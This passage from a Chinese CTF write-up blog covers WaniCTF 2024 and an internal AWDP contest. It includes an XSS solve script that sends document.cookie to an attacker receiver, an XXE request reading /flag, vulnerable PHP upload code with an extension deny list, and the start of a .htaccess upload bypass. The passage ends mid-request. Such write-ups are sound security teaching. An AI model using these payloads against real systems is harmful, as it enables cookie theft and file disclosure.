class="hljs-title">SHA</span>-256哈希算法计算时间戳的哈希值</span><br><span class="hljs-class">            <span class="hljs-title">signer</span> = <span class="hljs-title">DSS</span>.<span class="hljs-title">new</span>(<span class="hljs-title">key</span>, &#x27;<span class="hljs-title">fips</span>-186-3&#x27;)  # 使用<span class="hljs-title">ECC</span>密钥和<span class="hljs-title">DSS</span>签名方案创建签名器</span><br><span class="hljs-class">            <span class="hljs-title">signature</span> = <span class="hljs-title">signer</span>.<span class="hljs-title">sign</span>(<span class="hljs-title">h</span>)  # 对哈希值进行签名</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_response</span>(<span class="hljs-title">HTTPStatus</span>.<span class="hljs-title">OK</span>)  # 发送<span class="hljs-title">HTTP</span> 200状态码</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>&#x27;, &#x27;<span class="hljs-title">application</span>/<span class="hljs-title">json</span>; <span class="hljs-title">charset</span>=<span class="hljs-title">utf</span>-8&#x27;)  # 设置响应头，内容类型为<span class="hljs-title">JSON</span></span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Origin</span>&#x27;, &#x27;*&#x27;)  # 允许跨域请求</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">end_headers</span>()  # 结束响应头</span><br><span class="hljs-class">            <span class="hljs-title">res_body</span> = <span class="hljs-title">json</span>.<span class="hljs-title">dumps</span>(</span>&#123;<span class="hljs-string">&#x27;timestamp&#x27;</span>: timestamp.<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-string">&#x27;signature&#x27;</span>: signature.<span class="hljs-title function_ invoke__">hex</span>()&#125;)  <span class="hljs-comment"># 创建包含时间戳和签名的JSON响应体</span><br>            <span class="hljs-built_in">self</span>.wfile.<span class="hljs-title function_ invoke__">write</span>(res_body.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))  <span class="hljs-comment"># 将响应体写入响应并发送给客户端</span><br><br><span class="hljs-comment"># 创建HTTP服务器实例，绑定到本地地址和端口5001</span><br>handler = HTTPRequestHandler<br>httpd = <span class="hljs-title function_ invoke__">HTTPServer</span>((<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">5001</span>), handler)<br><br><span class="hljs-comment"># 服务器开始运行，开始处理请求</span><br>httpd.<span class="hljs-title function_ invoke__">serve_forever</span>()<br><br></code></pre></td></tr></table></figure><p>根据时间戳签名来认证<br>这里主要关键服务是timeserver，私钥公钥以及时间戳和签名都在这生成<br>没有私钥不可能伪造签名<br>注意请求的payload有一个timeserver的url字段，可以控制<br>想要自己控制私钥，可以自己vps搭一个timeserver<br>不过要https，vps得有域名ssl</p><h3 id="Noscript"><a href="#Noscript" class="headerlink" title="Noscript"></a>Noscript</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><br>URL = <span class="hljs-string">&quot;https://web-noscript-lz56g6.wanictf.org/&quot;</span><br>RECEIVER = <span class="hljs-string">&quot;http://ip:port/&quot;</span><br><br>res = requests.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;signin&quot;</span>)<br><span class="hljs-keyword">print</span>(res.text)<br>id1 = res.url.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>]<br>res = requests.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;user/&quot;</span> + id1 , data=&#123;<br>  <span class="hljs-string">&quot;username&quot;</span>: f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&lt;script&gt;new Image().src = (&quot;&#123;RECEIVER&#125;/?flag=&quot; + document.cookie)&lt;/script&gt;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&quot;profile&quot;</span>: <span class="hljs-string">&quot;test&quot;</span><br>&#125;)<br><br>res = requests.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;signin&quot;</span>)<br>id2 = res.url.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">print</span>(f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&#123;URL + &quot;username/&quot; + id1&#125;&quot;&gt;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br>res = requests.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;user/&quot;</span> + id2 , data=&#123;<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;test&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&quot;profile&quot;</span>: f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&#123;&quot;http://app:8080/username/&quot; + id1&#125;&quot;&gt;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>&#125;)<br><span class="hljs-keyword">print</span>(id1)<br><span class="hljs-keyword">print</span>(id2)<br>res = requests.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;report/&quot;</span>, data=&#123; <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;/user/&quot;</span> + id2&#125;)<br></code></pre></td></tr></table></figure><p>vps开http.server<br><img src="/mdimg/wanictf2024/1719224944636-dd747a29-449a-47e1-8d36-fde34cfa4e6e.png"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Surveillance-of-sus"><a href="#Surveillance-of-sus" class="headerlink" title="Surveillance_of_sus"></a>Surveillance_of_sus</h3><p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a><br><img src="/mdimg/wanictf2024/1719224994528-6cbf70a1-dd9f-418e-acb4-0ca2dfcc74ab.jpeg"><br><img src="/mdimg/wanictf2024/1719225002952-9620b382-9e31-4fd2-8767-5fd08a3b8828.jpeg"><br><img src="/mdimg/wanictf2024/1719225014627-f1b108e7-c1c1-454e-99d9-4ef469876920.jpeg"><br>FLAG{RDP_is_useful_yipeee}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某内部awdp测试赛</title>
    <link href="/2024/06/05/%E6%9F%90%E5%86%85%E9%83%A8awdp%E6%B5%8B%E8%AF%95%E8%B5%9B/"/>
    <url>/2024/06/05/%E6%9F%90%E5%86%85%E9%83%A8awdp%E6%B5%8B%E8%AF%95%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="ezXXE"><a href="#ezXXE" class="headerlink" title="ezXXE"></a>ezXXE</h1><p>附件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>  <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>  <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>  <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>  <span class="hljs-variable">$tzzzez</span> = <span class="hljs-variable">$creds</span>-&gt;tzzzez;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tzzzez</span>;<br>&#125;<br><span class="hljs-comment">//hint: flag in /flag</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>有回显xxe</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">POST / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">182.92</span>.<span class="hljs-number">117.61</span>:<span class="hljs-number">48279</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">125.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Referer: http://mitm/</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE payload [</span><br><span class="hljs-comment">&lt;!ELEMENT payload ANY&gt;</span><br><span class="hljs-comment">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="hljs-comment">]&gt;</span><br><span class="hljs-comment">&lt;creds&gt;</span><br><span class="hljs-comment">&lt;tzzzez&gt;&amp;xxe;&lt;/tzzzez&gt;</span><br><span class="hljs-comment">&lt;/creds&gt;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/awdp1/1717512765183-ef5f8760-a4f8-40dd-80bc-458c500e7ad6.png"></p><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p><code>libxml_disable_entity_loader(false);</code>改为<code>libxml_disable_entity_loader(true);</code><br>禁用外部实体<br>方案二、过滤用户提交的XML数据 关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;!DOCTYPE.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;!ENTITY.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SYSTEM.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/PUBLIC.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$tzzzez</span> = <span class="hljs-variable">$creds</span>-&gt;tzzzez;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tzzzez</span>;<br>&#125;<br><span class="hljs-comment">//hint: flag in /flag</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;!DOCTYPE.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;!ENTITY.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SYSTEM.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/PUBLIC.*?&gt;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$xmlfile</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$tzzzez</span> = <span class="hljs-variable">$creds</span>-&gt;tzzzez;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tzzzez</span>;<br>&#125;<br><span class="hljs-comment">//hint: flag in /flag</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h1 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;WWW_ROOT&quot;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_URL_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(WWW_ROOT,<span class="hljs-string">&quot;&quot;</span>,APP_ROOT));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br><br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>      <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>      <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>  &#125;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br><br><br>  &lt;div id=<span class="hljs-string">&quot;upload_panel&quot;</span>&gt;<br>    &lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>      &lt;p&gt;请选择要上传的图片：&lt;p&gt;<br>        &lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;上传&quot;/&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">msg</span>&quot;&gt;</span><br><span class="hljs-class">      &lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">      <span class="hljs-title">if</span>($<span class="hljs-title">msg</span> != <span class="hljs-title">null</span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;提示：&quot;</span>.<span class="hljs-variable">$msg</span>;<br>      &#125;<br>      <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br>        &lt;div id=<span class="hljs-string">&quot;img&quot;</span>&gt;<br>          <span class="hljs-meta">&lt;?php</span><br>          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_upload</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; width=&quot;250px&quot; /&gt;&#x27;</span>;<br>          &#125;<br>          <span class="hljs-meta">?&gt;</span><br>        &lt;/div&gt;<br>            &lt;/div&gt;<br></code></pre></td></tr></table></figure><h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>上传配置文件<code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">POST / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">182.92</span>.<span class="hljs-number">117.61</span>:<span 